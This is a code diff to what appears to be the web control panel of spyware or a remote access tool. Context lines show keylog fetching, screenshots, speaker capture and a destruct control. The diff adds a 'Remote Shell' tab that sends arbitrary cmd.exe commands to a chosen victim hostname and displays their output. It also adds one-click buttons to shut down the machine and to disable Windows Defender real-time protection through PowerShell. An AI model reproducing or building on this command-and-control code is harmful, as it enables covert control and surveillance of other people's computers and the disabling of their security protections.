@@ -83,6 +83,7 @@
       <button class="tab-btn active" onclick="switchTab('activity', this)">Activity</button>
       <button class="tab-btn" onclick="switchTab('screenshots', this)">Screenshots</button>
       <button class="tab-btn" onclick="switchTab('triggers', this)">Triggers</button>
+      <button class="tab-btn" onclick="switchTab('shell', this)">Shell</button>
     </div>
 
     <main id="tabActivity" class="tab-content active border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl">
@@ -144,13 +145,37 @@
       </table>
     </main>
 
-    <div id="pagination" class="flex items-center justify-between pt-2">
-      <div class="text-xs text-slate-500">Page <span id="pageNum">1</span></div>
-      <div class="flex gap-2">
-        <button id="prevPageBtn" class="px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-lg transition disabled:opacity-40 disabled:cursor-not-allowed" onclick="goToPage(currentPage - 1)" disabled>&larr; Previous</button>
-        <button id="nextPageBtn" class="px-3 py-1.5 text-xs font-medium text-slate-300 bg-slate-800 hover:bg-slate-700 border border-slate-700 rounded-lg transition disabled:opacity-40 disabled:cursor-not-allowed" onclick="goToPage(currentPage + 1)" disabled>Next &rarr;</button>
+    <main id="tabShell" class="tab-content border border-slate-800 bg-slate-900/20 rounded-xl overflow-hidden shadow-2xl p-5">
+      <h2 class="text-lg font-semibold text-slate-300 mb-4">Remote Shell</h2>
+      <p class="text-xs text-slate-500 mb-4">Execute commands on the device via <code class="text-emerald-400 bg-slate-800 px-1 rounded">cmd.exe</code>. Output captured up to 32K chars, 60s timeout.</p>
+      <div class="flex flex-wrap items-center gap-2 mb-4">
+        <button class="px-3 py-1.5 text-xs font-medium text-white bg-rose-700 hover:bg-rose-600 rounded-lg border border-rose-600 transition" onclick="execQuickCmd('shutdown /s /t 0')">Shutdown</button>
+        <button class="px-3 py-1.5 text-xs font-medium text-white bg-amber-700 hover:bg-amber-600 rounded-lg border border-amber-600 transition" onclick="execQuickCmd('shutdown /r /t 0')">Restart</button>
+        <button class="px-3 py-1.5 text-xs font-medium text-white bg-slate-700 hover:bg-slate-600 rounded-lg border border-slate-600 transition" onclick="execQuickCmd('rundll32.exe user32.dll,LockWorkStation')">Lock</button>
+        <button class="px-3 py-1.5 text-xs font-medium text-white bg-sky-700 hover:bg-sky-600 rounded-lg border border-sky-600 transition" onclick="execQuickOpenUrl()">Open URL</button>
+        <button class="px-3 py-1.5 text-xs font-medium text-white bg-red-800 hover:bg-red-700 rounded-lg border border-red-700 transition" onclick="execQuickCmd('powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true\"')">Disable Defender</button>
+        <button class="px-3 py-1.5 text-xs font-medium text-white bg-teal-700 hover:bg-teal-600 rounded-lg border border-teal-600 transition" onclick="execQuickCmd('systeminfo | findstr /B /C:\"OS Name\" /C:\"System Boot Time\" /C:\"Total Physical Memory\"')">Sys Info</button>
       </div>
-    </div>
+      <div class="flex items-center gap-3 mb-6">
+        <input type="text" id="shellInput" placeholder="whoami /all" class="flex-1 bg-slate-950 border border-slate-800 text-sm rounded-lg px-3 py-2.5 text-slate-200 font-mono placeholder-slate-500 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
+        <button class="px-5 py-2.5 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition disabled:opacity-50" id="shellExecBtn" onclick="execCommand()">Execute</button>
+      </div>
+      <div class="overflow-x-auto">
+        <table class="w-full text-left border-collapse">
+          <thead>
+            <tr class="bg-slate-900/80 border-b border-slate-800 text-xs font-semibold text-slate-400 uppercase tracking-wider">
+              <th class="py-3 px-4 w-52">Time</th>
+              <th class="py-3 px-4 w-40">Host</th>
+              <th class="py-3 px-4 w-64">Command</th>
+              <th class="py-3 px-4">Output</th>
+            </tr>
+          </thead>
+          <tbody id="execBody" class="text-sm divide-y divide-slate-800/50">
+            <tr><td class="py-8 px-4 text-center text-slate-500" colspan="4">No commands executed yet</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </main>
   </div>
 
   <div class="toast" id="toast"></div>
@@ -399,8 +424,10 @@ function switchTab(tab, btn) {
   document.getElementById('tabActivity').classList.toggle('active', tab === 'activity');
   document.getElementById('tabScreenshots').classList.toggle('active', tab === 'screenshots');
   document.getElementById('tabTriggers').classList.toggle('active', tab === 'triggers');
+  document.getElementById('tabShell').classList.toggle('active', tab === 'shell');
   if (tab === 'screenshots') fetchScreenshots();
   if (tab === 'triggers') fetchTriggers();
+  if (tab === 'shell') fetchExecResults();
 }
 
 async function fetchTriggers() {
@@ -535,6 +562,69 @@ async function sendSpeakerCapture() {
   btn.disabled = false; btn.textContent = 'Capture Speaker';
 }
 
+async function execCommand() {
+  const btn = document.getElementById('shellExecBtn');
+  const input = document.getElementById('shellInput');
+  const hostname = document.getElementById('hostnameInput').value.trim();
+  const cmd = input.value.trim();
+  if (!hostname) { showToast('Select a device first', 'error'); return; }
+  if (!cmd) { showToast('Enter a command', 'error'); return; }
+  btn.disabled = true; btn.textContent = 'Executing...';
+  try {
+    const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'exec', hostname: hostname, payload: cmd, executed: false })
+    });
+    if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
+    showToast('Exec "' + cmd + '" sent to ' + hostname + ' (check Shell tab in ~60s)', 'success');
+    input.value = '';
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+  btn.disabled = false; btn.textContent = 'Execute';
+}
+
+async function execQuickCmd(cmd) {
+  document.getElementById('shellInput').value = cmd;
+  await execCommand();
+}
+
+async function execQuickOpenUrl() {
+  const url = prompt('Enter URL to open:');
+  if (!url || !url.trim()) return;
+  document.getElementById('shellInput').value = 'start "" "' + url.trim() + '"';
+  await execCommand();
+}
+
+async function fetchExecResults() {
+  try {
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/exec_results?select=id,created_at,hostname,command,output,exit_code&order=created_at.desc&limit=50'));
+    if (!res.ok) return;
+    const data = await res.json();
+    const tbody = document.getElementById('execBody');
+    if (!data || data.length === 0) {
+      tbody.innerHTML = '<tr><td class="py-8 px-4 text-center text-slate-500" colspan="4">No commands executed yet</td></tr>';
+      return;
+    }
+    tbody.innerHTML = data.map(row => {
+      const ts = row.created_at ? new Date(row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z').toLocaleString() : '-';
+      const host = row.hostname || '-';
+      const cmd = row.command || '';
+      const output = row.output || '';
+      const code = row.exit_code;
+      const ecClass = code === 0 ? 'text-emerald-400' : 'text-rose-400';
+      return '<tr class="hover:bg-slate-800/30 transition-colors">'
+        + '<td class="py-3 px-4 text-slate-400 whitespace-nowrap">' + ts + '</td>'
+        + '<td class="py-3 px-4 text-emerald-400 font-medium">' + escapeHtml(displayHost(host)) + '</td>'
+        + '<td class="py-3 px-4 text-slate-200 mono-log"><span class="text-amber-300">$</span> ' + escapeHtml(cmd) + '</td>'
+        + '<td class="py-3 px-4" onclick="this.querySelector(\'pre\').classList.toggle(\'max-h-8\')" style="cursor:pointer">'
+        + '<span class="text-xs text-slate-500 ' + ecClass + '">exit ' + code + ' &bull; click to ' + (output.length > 120 ? 'expand/collapse' : 'view') + '</span>'
+        + '<pre class="mono-log text-xs text-slate-300 mt-1 overflow-x-auto max-h-8 transition-all duration-200 whitespace-pre-wrap break-all">' + escapeHtml(output) + '</pre>'
+        + '</td>'
+        + '</tr>';
+    }).join('');
+  } catch (e) {}
+}
+
 document.getElementById('stopBtn').addEventListener('click', sendStop);
 document.getElementById('destructBtn').addEventListener('click', sendDestruct);
 
@@ -544,6 +634,9 @@ document.getElementById('windowFilter').addEventListener('input', debounce(() =>
 document.getElementById('triggerInput').addEventListener('keydown', (e) => {
   if (e.key === 'Enter') addTrigger();
 });
+document.getElementById('shellInput').addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') execCommand();
+});
 
 window.addEventListener('DOMContentLoaded', () => {
   populateHostnames();
@@ -552,6 +645,7 @@ window.addEventListener('DOMContentLoaded', () => {
     if (currentTab === 'activity') { fetchKeys(); populateHostnames(); }
     else if (currentTab === 'screenshots') fetchScreenshots();
     else if (currentTab === 'triggers') fetchTriggers();
+    else if (currentTab === 'shell') fetchExecResults();
   }, 20000);
   setInterval(tick, 1000);
 });
